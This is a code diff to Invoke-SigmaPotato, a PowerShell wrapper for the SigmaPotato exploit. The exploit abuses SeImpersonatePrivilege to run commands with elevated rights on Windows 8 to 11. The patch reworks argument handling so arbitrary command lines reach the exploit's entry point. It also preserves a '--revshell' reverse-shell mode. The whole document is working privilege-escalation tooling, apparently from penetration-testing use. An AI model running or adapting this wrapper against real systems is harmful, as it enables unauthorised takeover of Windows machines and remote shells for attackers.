@@ -2,7 +2,7 @@ function Invoke-SigmaPotato {
 #.SYNOPSIS
 # Wrapper for SeImpersonatePrivilege Exploitation via SigmaPotatoCore (.NET v2.0)
 # ARBITRARY VERSION NUMBER:  1.0.0
-# AUTHOR:  Tyler McCann (@tylerdotrar)
+# AUTHOR:  Tyler McCann (@tylerdotrar) + mverschu (patch)
 #
 #.DESCRIPTION
 # SigmaPotato is a C# binary written to exploit SeImpersonatePrivilege on most Windows systems (Windows 8 - 11,
@@ -25,7 +25,18 @@ function Invoke-SigmaPotato {
 
 
     Param (
-        [string]$Command,
+        # Supports BOTH styles:
+        #   Invoke-SigmaPotato whoami /all
+        #   Invoke-SigmaPotato -Command whoami /all
+        #   Invoke-SigmaPotato -Command 'cmd.exe /c "whoami /all"'
+        [Alias('Cmd')]
+        [object]$Command,
+
+        # Captures any remaining tokens not otherwise bound (including when -Command is used).
+        [Parameter(Position = 0, ValueFromRemainingArguments = $true)]
+        [Alias('Args')]
+        [string[]]$CommandArgs,
+
         [switch]$Help
     )
 
@@ -61,8 +72,44 @@ function Invoke-SigmaPotato {
     $StringWriter = [IO.StringWriter]::new()
     [Console]::SetOut($StringWriter)
 
+    # If -Command was supplied AND there are extra trailing args (e.g. -Command whoami /all),
+    # merge them so PowerShell doesn't throw ParameterBindingException.
+    if ($null -ne $Command -and $CommandArgs -and $CommandArgs.Count -gt 0) {
+        $Command = @("$Command") + @($CommandArgs)
+    }
+
+    # SigmaPotato's C# entrypoint expects:
+    # - args.Length == 1 for normal command execution (args[0] is the FULL command line string)
+    # - args[0] == '--revshell' and args.Length == 3 for reverse shell
+    # So we build the string[] accordingly.
+    $Argv = @()
+
+    # Helper: join tokens into a single command line string, quoting tokens that contain whitespace.
+    function Join-CommandLineTokens([string[]]$Tokens) {
+        ($Tokens | ForEach-Object {
+            $t = "$_"
+            if ($t -match '\s' -or $t -match '"') {
+                '"' + ($t -replace '"','\"') + '"'
+            } else {
+                $t
+            }
+        }) -join ' '
+    }
+
+    if ($Command -is [string[]]) {
+        if ($Command.Count -gt 0 -and ($Command[0] -eq '--revshell' -or $Command[0] -eq '--help')) {
+            $Argv = $Command
+        } else {
+            $Argv = @( (Join-CommandLineTokens $Command) )
+        }
+    }
+    else {
+        # Single string: pass as the one-and-only argument. (Allows: -Command 'whoami /all')
+        $Argv = @("$Command")
+    }
+
     # Binary Namespace
-    [SigmaPotato]::Main($Command.Split(" "))
+    [SigmaPotato]::Main($Argv)
 
     [Console]::SetOut($OldConsoleOut)
     $StringWriter.ToString()
